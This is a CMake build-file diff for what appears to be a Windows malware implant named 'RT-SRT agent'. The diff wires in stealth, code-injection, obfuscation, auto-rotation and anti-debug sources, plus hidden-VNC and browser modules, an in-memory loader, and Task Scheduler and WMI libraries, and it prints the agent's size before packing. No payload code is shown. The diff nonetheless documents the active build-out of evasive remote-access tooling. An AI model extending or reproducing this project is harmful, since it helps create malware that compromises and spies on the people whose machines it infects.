@@ -10,6 +10,7 @@ set(CORE_SOURCES
     src/logger/file_logger.cpp
     src/logger/encrypt_logger.cpp
     src/integration.cpp
+    src/utils.cpp
 )
 
 # Browser module sources
@@ -42,6 +43,10 @@ set(STEALTH_SOURCES
     src/stealth/anti_debug.cpp
     src/stealth/in_memory_loader.cpp
     src/stealth/stealth_system.cpp
+    src/stealth/stealth_manager.cpp
+    src/stealth/code_injection.cpp
+    src/stealth/auto_rotation.cpp
+    src/stealth/obfuscation.cpp
 )
 
 # HVNC sources
@@ -181,13 +186,7 @@ if(WIN32)
         ole32
         oleaut32
         uuid
-        # comsupp  # Not available in MinGW
-        
-        # Task Scheduler
-        taskschd
-        
-        # WMI libraries
-        wbemuuid
+        # comsupp  # Not available in MinGW - commented out
         
         # Process and debugging
         psapi
@@ -197,6 +196,16 @@ if(WIN32)
         secur32
         netapi32
     )
+    
+    # Additional libraries for MSVC only
+    if(MSVC)
+        target_link_libraries(${AGENT_NAME} PRIVATE
+            # Task Scheduler (MSVC only)
+            taskschd
+            # WMI libraries
+            wbemuuid
+        )
+    endif()
     
     # Set subsystem
     if(MSVC)
@@ -221,6 +230,9 @@ if(WIN32)
             )
         endif()
     endif()
+else()
+    # RT-SRT requires Windows platform for full functionality
+    message(FATAL_ERROR "RT-SRT agent can only be built on Windows platform. Current platform: ${CMAKE_SYSTEM_NAME}")
 endif()
 
 # Optimization settings
@@ -301,7 +313,7 @@ add_custom_command(TARGET ${AGENT_NAME} POST_BUILD
     COMMAND ${CMAKE_COMMAND} -E echo "  HVNC Module: ${ENABLE_HVNC_MODULE}"
     COMMAND ${CMAKE_COMMAND} -E echo "  Advanced Logging: ${ENABLE_ADVANCED_LOGGING}"
     COMMAND ${CMAKE_COMMAND} -E echo "Agent size before packing:"
-    COMMAND ${CMAKE_SIZE} $<TARGET_FILE:${AGENT_NAME}>
+    COMMAND ${CMAKE_COMMAND} -E echo "Agent binary: $<TARGET_FILE:${AGENT_NAME}>"
     COMMAND ${CMAKE_COMMAND} -E echo "==================================================="
 )
 
